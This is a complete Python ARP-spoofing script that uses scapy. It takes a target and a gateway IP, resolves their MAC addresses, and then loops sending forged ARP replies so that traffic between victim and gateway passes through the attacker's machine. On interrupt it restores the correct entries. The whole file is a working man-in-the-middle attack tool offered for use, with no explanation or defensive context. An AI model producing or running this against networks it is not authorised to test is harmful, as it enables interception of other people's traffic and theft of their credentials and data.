import scapy.all as scapy
import time
import optparse


def get_user_input():
    parse_object = optparse.OptionParser()
    parse_object.add_option("-t", "--target", dest="target_ip", help=" Target IP address")
    parse_object.add_option("-g", "--gateway", dest="gateway_ip", help=" Gateway IP address")

    options = parse_object.parse_args()[0]

    if not options.target_ip:
        print("Enter Target IP")

    if not options.gateway_ip:
        print("Enter Gateway IP")

    return options


def get_target_mac(ip):
    arp_request_packet = scapy.ARP(pdst=ip)
    broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    combined_packet = broadcast_packet/arp_request_packet
    answer_list = scapy.srp(combined_packet, timeout=1, verbose=False)[0]

    return answer_list[0][1].hwsrc


def arp_poison(target_ip, poisoned_ip):

    target_mac = get_target_mac(target_ip)
    arp_response = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=poisoned_ip)
    scapy.send(arp_response, verbose=False)


def reset(victim_ip, gateway_ip):
    victim_mac = get_target_mac(victim_ip)
    gateway_mac = get_target_mac(gateway_ip)

    arp_response = scapy.ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=gateway_ip, hwsrc=gateway_mac)
    scapy.send(arp_response, verbose=False, count=10)


number = 0


input_ips = get_user_input()
user_target_ip = input_ips.target_ip
user_gateway_ip = input_ips.gateway_ip
try:
    while True:

        arp_poison(user_target_ip, user_gateway_ip)  # victim_ip
        arp_poison(user_gateway_ip, user_target_ip)  # gateway_ip

        number += 2

        print("\rSending packets" + str(number), end="")

        time.sleep(4)

except KeyboardInterrupt:
    print("\n Quit & Reset")
    reset(user_target_ip, user_gateway_ip)
    reset(user_gateway_ip, user_target_ip)

